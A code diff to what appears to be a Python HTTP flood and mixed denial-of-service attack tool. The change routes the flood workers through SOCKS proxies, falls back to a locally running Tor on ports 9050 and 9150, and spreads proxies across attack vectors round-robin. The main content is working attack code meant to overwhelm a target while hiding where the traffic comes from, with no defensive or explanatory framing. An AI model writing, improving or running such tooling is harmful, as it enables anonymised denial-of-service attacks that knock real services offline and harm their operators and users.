@@ -11,6 +11,7 @@ import signal
 import random
 import psutil
 import threading
+import socket
 from datetime import datetime
 from typing import Optional, Dict, List, Any
 from urllib.parse import urlparse
@@ -1609,22 +1610,39 @@ async def run_http_flood(target: str, cfg: dict):
         print(f" {c('g','[+]')} Proxy pool: {opts['proxy_pool'].stats().get('total', 0)} proxies")
     _rich_sep()
 
-    # Build proxy URL list for the multi-vector engine
+    # Build proxy URL list for H2 workers (SOCKS5 only — H2Blaster supports SOCKS5)
     proxy_urls = []
     if opts.get("proxy_pool") is not None:
         try:
             for plist in opts["proxy_pool"]._pools.values():
                 for ps in plist:
                     u = getattr(ps, "url", None) or (ps if isinstance(ps, str) else None)
-                    if u:
+                    if u and u.startswith("socks"):
                         proxy_urls.append(u)
             if not proxy_urls:
                 for ps in getattr(opts["proxy_pool"], "_pending", []) or []:
                     u = getattr(ps, "url", None) or (ps if isinstance(ps, str) else None)
-                    if u:
+                    if u and u.startswith("socks"):
                         proxy_urls.append(u)
         except Exception:
             proxy_urls = []
+
+    # Also check if user has Tor running locally (common SOCKS5 fallback)
+    socks_fallback = any([
+        u.startswith("socks5://127.0.0.1:") or u.startswith("socks5://localhost:")
+        for u in proxy_urls
+    ])
+    if not proxy_urls:
+        for port in [9050, 9150]:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(1)
+            try:
+                s.connect(("127.0.0.1", port))
+                proxy_urls.append(f"socks5://127.0.0.1:{port}")
+            except Exception:
+                pass
+            finally:
+                s.close()
 
     # Spin up the AutoDashboard for live per-vector RPS rendering.
     from core.monitor.auto_dashboard import AutoDashboard
@@ -1652,11 +1670,13 @@ async def run_http_flood(target: str, cfg: dict):
     dash.start()
 
     handles = []
-    for name, label, share, conns in vectors:
+    for i, (name, label, share, conns) in enumerate(vectors):
         wrps = max(1000, int(rps * share))
         stop_evt = _th.Event()
         result: dict = {}
         proxy_q = dash.get_stats_queue()
+        # Assign proxy round-robin (or empty string = direct connection)
+        pw = proxy_urls[i % len(proxy_urls)] if proxy_urls else ""
 
         class _Proxy:
             def __init__(self, vn):
@@ -1676,7 +1696,7 @@ async def run_http_flood(target: str, cfg: dict):
                 duration=float(duration), worker_id=abs(hash(name)) & 0xFFFF,
                 stats_queue=_Proxy(name), stop_event=stop_evt,
                 host_header=host_header, connections=conns,
-                result_dict=result,
+                result_dict=result, proxy_url=pw,
             ),
             daemon=True,
         )
@@ -2540,12 +2560,24 @@ async def run_mixed_attack(target: str, cfg: dict):
                 for plist in getattr(pool, "_pools", {}).values():
                     for ps in plist:
                         u = getattr(ps, "url", None)
-                        if u:
+                        if u and u.startswith("socks"):
                             proxy_urls.append(u)
                 for ps in getattr(pool, "_pending", []) or []:
                     u = getattr(ps, "url", None)
-                    if u:
+                    if u and u.startswith("socks"):
                         proxy_urls.append(u)
+            if not proxy_urls:
+                # Fallback: check for local Tor
+                for port in [9050, 9150]:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.settimeout(1)
+                    try:
+                        s.connect(("127.0.0.1", port))
+                        proxy_urls.append(f"socks5://127.0.0.1:{port}")
+                    except Exception:
+                        pass
+                    finally:
+                        s.close()
         except Exception as e:
             print(f" {c('y','[!]')} proxy setup: {e}")
 
@@ -2620,11 +2652,12 @@ async def run_mixed_attack(target: str, cfg: dict):
     dash.start()
 
     handles = []
-    for name, label, share, conns in vectors:
+    for i, (name, label, share, conns) in enumerate(vectors):
         wrps = max(1000, int(rps * share))
         stop_evt = _th.Event()
         result: dict = {}
         proxy_q = dash.get_stats_queue()
+        pw = proxy_urls[i % len(proxy_urls)] if proxy_urls else ""
 
         class _Proxy:
             def __init__(self, vn):
@@ -2644,7 +2677,7 @@ async def run_mixed_attack(target: str, cfg: dict):
                 duration=float(duration), worker_id=abs(hash(name)) & 0xFFFF,
                 stats_queue=_Proxy(name), stop_event=stop_evt,
                 host_header=host_header, connections=conns,
-                result_dict=result,
+                result_dict=result, proxy_url=pw,
             ),
             daemon=True,
         )
